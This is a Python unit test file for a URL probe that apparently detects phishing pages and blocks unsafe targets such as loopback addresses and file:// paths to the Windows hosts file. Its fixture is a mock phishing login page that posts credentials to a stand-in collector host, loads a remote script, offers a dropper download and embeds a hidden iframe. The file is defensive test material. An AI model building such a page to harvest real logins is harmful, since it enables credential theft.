import unittest
from urllib.error import URLError
from unittest.mock import patch

from app.analyzers.url_probe import ProbeBlockedError, _assert_safe_target, _extract_html_signals, probe_url


class UrlProbeSafetyTests(unittest.TestCase):
    def test_private_loopback_target_is_blocked(self):
        with self.assertRaises(ProbeBlockedError):
            _assert_safe_target("http://127.0.0.1/admin")

    def test_non_http_scheme_is_blocked(self):
        with self.assertRaises(ProbeBlockedError):
            _assert_safe_target("file:///c:/Windows/System32/drivers/etc/hosts")

    def test_extract_html_signals_collects_form_iframe_and_script_features(self):
        html = """
        <html>
          <head>
            <title>보안 로그인</title>
            <meta name="description" content="계정 인증이 필요합니다">
            <script src="https://evil.test/loader.js"></script>
          </head>
          <body>
            <form action="https://collector.evil.test/submit">
              <input type="text" name="id">
              <input type="password" name="pw">
            </form>
            <img src="/static/logo.png">
            <iframe src="https://tracker.evil.test/frame" width="0" height="0"></iframe>
            <a href="https://evil.test/dropper.exe" download>지금 다운로드</a>
            <a href="https://safehelp.test/help">도움말</a>
            <a href="/account">계정</a>
            <script>
              eval("x");
              document.write("y");
              unescape("%41");
            </script>
          </body>
        </html>
        """

        signals = _extract_html_signals(html, base_url="https://secure.example.com/login")

        self.assertEqual(signals["title"], "보안 로그인")
        self.assertEqual(signals["form_count"], 1)
        self.assertEqual(signals["password_input_count"], 1)
        self.assertEqual(signals["offdomain_form_action_count"], 1)
        self.assertEqual(signals["iframe_count"], 1)
        self.assertEqual(signals["hidden_iframe_count"], 1)
        self.assertEqual(signals["asset_reference_count"], 3)
        self.assertEqual(signals["external_asset_count"], 2)
        self.assertEqual(signals["anchor_count"], 3)
        self.assertEqual(signals["external_anchor_count"], 2)
        self.assertEqual(signals["suspicious_js_function_count"], 3)
        self.assertIn("eval x1", signals["suspicious_js_functions"])
        self.assertEqual(signals["suspicious_download_link_count"], 1)

    @patch("app.analyzers.url_probe.fetch_snapshot")
    def test_probe_url_keeps_browser_snapshot_when_crawler_probe_fails(self, mock_fetch_snapshot):
        mock_fetch_snapshot.side_effect = [
            {
                "http_status": 200,
                "final_url": "https://secure.example.com/login",
                "redirect_hops": [],
                "redirect_hop_count": 0,
                "title": "보안 로그인",
            },
            URLError("crawler timeout"),
        ]

        result = probe_url("https://secure.example.com/login")

        self.assertTrue(result["performed"])
        self.assertEqual(result["browser"]["title"], "보안 로그인")
        self.assertIn("crawler timeout", result["crawler"]["error"])


if __name__ == "__main__":
    unittest.main()
